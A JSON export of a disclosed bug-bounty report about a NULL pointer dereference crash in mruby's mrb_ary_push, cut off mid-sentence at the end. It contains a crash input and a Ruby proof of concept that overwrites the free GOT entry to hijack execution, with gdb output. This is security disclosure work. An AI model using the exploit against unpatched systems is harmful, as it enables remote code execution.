{"id":420115,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjAxMTU=","url":"https://hackerone.com/reports/420115","title":"Crash in mrb_ary_push","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2018-10-06T18:30:45.630Z","submitted_at":"2018-10-06T18:30:45.630Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dgaletic","url":"/dgaletic","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-09-04T13:33:48.294Z","bug_reporter_agreed_on_going_public_at":"2019-09-03T10:30:04.775Z","team_member_agreed_on_going_public_at":"2019-09-04T13:33:48.218Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"PoC\n===\nThe following demonstrates a crash:\n\n    def method_missing(*)\n    end\n    {}.[]0[*0] %=\n    begin{0=\u003e0}\n    00end\n\n\nDebug info\n==========\n\nThe crash happens in `mrb_ary_push`:\n\n    495│ mrb_ary_push(mrb_state *mrb, mrb_value ary, mrb_value elem)\n    496│ {\n    497│   struct RArray *a = mrb_ary_ptr(ary);\n    498├─\u003e mrb_int len = ARY_LEN(a);\n\n    (gdb) p a\n    $1 = (struct RArray *) 0x0\n\n\nValgrind report:\n\n    ==17609== Memcheck, a memory error detector\n    ==17609== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.\n    ==17609== Using Valgrind-3.14.0.GIT and LibVEX; rerun with -h for copyright info\n    ==17609== Command: mruby poc\n    ==17609==\n    ==17609== Invalid read of size 4\n    ==17609==    at 0x136134: mrb_ary_push (array.c:498)\n    ==17609==    by 0x16EEAE: mrb_vm_exec (vm.c:2614)\n    ==17609==    by 0x1647E6: mrb_vm_run (vm.c:972)\n    ==17609==    by 0x1787F7: mrb_top_run (vm.c:2999)\n    ==17609==    by 0x1523E4: mrb_load_exec (parse.y:6013)\n    ==17609==    by 0x1525C6: mrb_load_file_cxt (parse.y:6022)\n    ==17609==    by 0x10DBF1: main (mruby.c:280)\n    ==17609==  Address 0x0 is not stack'd, malloc'd or (recently) free'd\n\nTest platform\n=============\n* Arch Linux\n\nmruby SHA: a690aef8d3219e3123822e741e2bb7c97220425c\n\nThank you,\nDinko Galetic\nDenis Kasak\n\n## Impact\n\nDOS through crashing the mruby process.","vulnerability_information_html":"\u003ch1 id=\"poc\"\u003ePoC\u003c/h1\u003e\n\n\u003cp\u003eThe following demonstrates a crash:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edef method_missing(*)\nend\n{}.[]0[*0] %=\nbegin{0=\u0026gt;0}\n00end\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"debug-info\"\u003eDebug info\u003c/h1\u003e\n\n\u003cp\u003eThe crash happens in \u003ccode\u003emrb_ary_push\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e495│ mrb_ary_push(mrb_state *mrb, mrb_value ary, mrb_value elem)\n496│ {\n497│   struct RArray *a = mrb_ary_ptr(ary);\n498├─\u0026gt; mrb_int len = ARY_LEN(a);\n\n(gdb) p a\n$1 = (struct RArray *) 0x0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eValgrind report:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e==17609== Memcheck, a memory error detector\n==17609== Copyright (C) 2002-2017, and GNU GPL\u0026#39;d, by Julian Seward et al.\n==17609== Using Valgrind-3.14.0.GIT and LibVEX; rerun with -h for copyright info\n==17609== Command: mruby poc\n==17609==\n==17609== Invalid read of size 4\n==17609==    at 0x136134: mrb_ary_push (array.c:498)\n==17609==    by 0x16EEAE: mrb_vm_exec (vm.c:2614)\n==17609==    by 0x1647E6: mrb_vm_run (vm.c:972)\n==17609==    by 0x1787F7: mrb_top_run (vm.c:2999)\n==17609==    by 0x1523E4: mrb_load_exec (parse.y:6013)\n==17609==    by 0x1525C6: mrb_load_file_cxt (parse.y:6022)\n==17609==    by 0x10DBF1: main (mruby.c:280)\n==17609==  Address 0x0 is not stack\u0026#39;d, malloc\u0026#39;d or (recently) free\u0026#39;d\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"test-platform\"\u003eTest platform\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eArch Linux\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003emruby SHA: a690aef8d3219e3123822e741e2bb7c97220425c\u003c/p\u003e\n\n\u003cp\u003eThank you,\u003cbr\u003e\nDinko Galetic\u003cbr\u003e\nDenis Kasak\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eDOS through crashing the mruby process.\u003c/p\u003e\n","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":51,"name":"NULL Pointer Dereference"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":356515,"file_name":"poc","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/356/515/063bc1c17732fc5f1fe456bd62f08dcbb67176f5/poc?response-content-disposition=attachment%3B%20filename%3D%22poc%22%3B%20filename%2A%3DUTF-8%27%27poc\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055527Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=7a5aef16ed004f234f32803f93193def662b7766e7ea5b74d4837f53f3638c4a","file_size":58,"type":"text/plain"}],"allow_singular_disclosure_at":"2019-10-03T10:30:05.404Z","allow_singular_disclosure_after":-39122722.12808293,"singular_disclosure_allowed":true,"vote_count":37,"voters":["dgaletic","mik317","sameerphad72","dhakal_ananda","mygf","0xatul","an0nym0us","khizer47","cyberunit","z41b1337_","and 27 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3446156,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a slightly shorter POC:\n```\ndef method_missing(*)\nend[*0]%=begin{0=\u003e0}\n00end\n```","markdown_message":"\u003cp\u003eHere is a slightly shorter POC:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003edef method_missing(*)\nend[*0]%=begin{0=\u0026gt;0}\n00end\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-10-07T21:41:17.133Z","updated_at":"2018-10-07T21:41:17.133Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3462450,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the crash, and opened an upstream issue: https://github.com/mruby/mruby/issues/4135","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the crash, and opened an upstream issue: \u003ca title=\"https://github.com/mruby/mruby/issues/4135\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F4135\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/4135\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-10T20:43:52.319Z","updated_at":"2018-10-10T20:43:52.319Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3467520,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is a write-what-where bug (writing 16 bytes) which can be used\nto achieve RCE.\n\n# POC\n\n```ruby\n    def method_missing(*)\n    end\n\n    def to_bytes(x)\n    arr = []\n    while x \u003e 0\n        arr.push((x \u0026 0xff).chr)\n        x \u003e\u003e= 8\n    end\n    len = arr.length\n    while len \u003c 8\n        arr.push(\"\\x00\")\n        len += 1\n    end\n    arr.join\n    end\n\n    TARGET = 0xdeadbeef\n\n    base  = 0x555555554000\n    free  = 0xba030\n    where = to_bytes((base + free) / 16) + \"\\0\\0\"\n    what  = TARGET - base\n\n    f[*a] += begin\n                {where =\u003e what}\n                base\n            end\n```\n\n# Discussion\n\nRunning the POC in gdb on my Arch Linux machine results in the\nfollowing\n\n    Program received signal SIGSEGV, Segmentation fault.\n    0x00000000deadbeef in ?? ()\n\nThe basic idea is that the pointer `a` in `mrb_ary_push` can be\ncontrolled to be `0x0` while also having the ability to set `len`\nto any value in this line (`src/array.c:503`):\n\n    ARY_PTR(a)[len] = elem;\n\nFurthermore, `elem` is of size 16 and is also controllable. This\nallows us to write an arbitrary 16 bytes anywhere.\n\nIn the POC, `where` (partially) maps onto the `ary` C variable,\nwhile `what` maps to `elem`. It uses the write-what-where to\noverwrite the `free` GOT entry which redirects the next `free` call\nto an arbitrary attacker-chosen address.\n\nThe `base` is necessary due to PIE but is predictable. The address\nof the `free` GOT entry varies with the exact compilation\nprocedure, but is also easily guesstimated and can be obtained\nusing\n\n    ➜ objdump -R mruby | grep free\n    00000000000ba030 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5\n\nmruby was built with `clang version 7.0.0\n(tags/RELEASE_700/final)` (just running `make` in the root\nof the repository) and the commit is the same as in the\nabove report.\n\n","markdown_message":"\u003cp\u003eThis is a write-what-where bug (writing 16 bytes) which can be used\u003cbr\u003e\nto achieve RCE.\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePOC\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003emethod_missing\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eto_bytes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xff\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;=\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n    \u003cspan class=\"n\"\u003elen\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003elength\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"n\"\u003elen\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x00\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003elen\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n    \u003cspan class=\"n\"\u003earr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ejoin\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n    \u003cspan class=\"no\"\u003eTARGET\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xdeadbeef\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003ebase\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mh\"\u003e0x555555554000\u003c/span\u003e\n    \u003cspan class=\"n\"\u003efree\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xba030\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ewhere\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eto_bytes\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003ebase\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003efree\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\0\\0\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ewhat\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eTARGET\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003ebase\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"k\"\u003ebegin\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003ewhere\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003ewhat\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n                \u003cspan class=\"n\"\u003ebase\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"discussion\"\u003eDiscussion\u003c/h1\u003e\n\n\u003cp\u003eRunning the POC in gdb on my Arch Linux machine results in the\u003cbr\u003e\nfollowing\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eProgram received signal SIGSEGV, Segmentation fault.\n0x00000000deadbeef in ?? ()\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe basic idea is that the pointer \u003ccode\u003ea\u003c/code\u003e in \u003ccode\u003emrb_ary_push\u003c/code\u003e can be\u003cbr\u003e\ncontrolled to be \u003ccode\u003e0x0\u003c/code\u003e while also having the ability to set \u003ccode\u003elen\u003c/code\u003e\u003cbr\u003e\nto any value in this line (\u003ccode\u003esrc/array.c:503\u003c/code\u003e):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eARY_PTR(a)[len] = elem;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFurthermore, \u003ccode\u003eelem\u003c/code\u003e is of size 16 and is also controllable. This\u003cbr\u003e\nallows us to write an arbitrary 16 bytes anywhere.\u003c/p\u003e\n\n\u003cp\u003eIn the POC, \u003ccode\u003ewhere\u003c/code\u003e (partially) maps onto the \u003ccode\u003eary\u003c/code\u003e C variable,\u003cbr\u003e\nwhile \u003ccode\u003ewhat\u003c/code\u003e maps to \u003ccode\u003eelem\u003c/code\u003e. It uses the write-what-where to\u003cbr\u003e\noverwrite the \u003ccode\u003efree\u003c/code\u003e GOT entry which redirects the next \u003ccode\u003efree\u003c/code\u003e call\u003cbr\u003e\nto an arbitrary attacker-chosen address.\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003ebase\u003c/code\u003e is necessary due to PIE but is predictable. The address\u003cbr\u003e\nof the \u003ccode\u003efree\u003c/code\u003e GOT entry varies with the exact compilation\u003cbr\u003e\nprocedure, but is also easily guesstimated and can be obtained\u003cbr\u003e\nusing\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e➜ objdump -R mruby | grep free\n00000000000ba030 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003emruby was built with \u003ccode\u003eclang version 7.0.0\u003cbr\u003e\n(tags/RELEASE_700/final)\u003c/code\u003e (just running \u003ccode\u003emake\u003c/code\u003e in the root\u003cbr\u003e\nof the repository) and the commit is the same as in the\u003cbr\u003e\nabove report.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-11T19:45:26.893Z","updated_at":"2018-10-11T19:45:26.893Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":359113,"filename":"rce.rb","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/359/113/beccf8f3eda953b9982d67e01eb30880bc6b4ea4/rce.rb?response-content-disposition=attachment%3B%20filename%3D%22rce.rb%22%3B%20filename%2A%3DUTF-8%27%27rce.rb\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055527Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=35dedf5011d8fd9abd606edc02e0889c8cd437c9d4af489b2d6052ca73ca1193"}],"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3564064,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report, and sorry for the delay in closing this off. This issue was resolved in the following upstream commit:\n\nhttps://github.com/mruby/mruby/commit/d2313aebd6940df8d3fec53c6397bc8c0cde9cff\n\nOur next round of bounty decisions will take place within a week, so we'll be in touch with you again soon.","markdown_message":"\u003cp\u003eThanks again for your report, and sorry for the delay in closing this off. This issue was resolved in the following upstream commit:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/mruby/mruby/commit/d2313aebd6940df8d3fec53c6397bc8c0cde9cff\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Fd2313aebd6940df8d3fec53c6397bc8c0cde9cff\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/d2313aebd6940df8d3fec53c6397bc8c0cde9cff\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place within a week, so we\u0026#39;ll be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-31T15:45:02.279Z","updated_at":"2018-10-31T15:45:02.279Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dgaletic","url":"/dgaletic"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3571550,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-01T18:52:05.929Z","updated_at":"2018-11-01T18:52:05.929Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"dgaletic","url":"/dgaletic"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3572696,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the bounty! We do have a quick question: have you taken into account the RCE demonstration for this one? More generally, is demonstrating RCE ability/register control inside the mruby process (but without sandbox bypass) useful to you and/or does it affect the bounty amount?","markdown_message":"\u003cp\u003eThank you for the bounty! We do have a quick question: have you taken into account the RCE demonstration for this one? More generally, is demonstrating RCE ability/register control inside the mruby process (but without sandbox bypass) useful to you and/or does it affect the bounty amount?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-01T22:29:37.196Z","updated_at":"2018-11-01T22:29:37.196Z","actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3575759,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As noted on our program page, bounty payouts above $1,000 are only 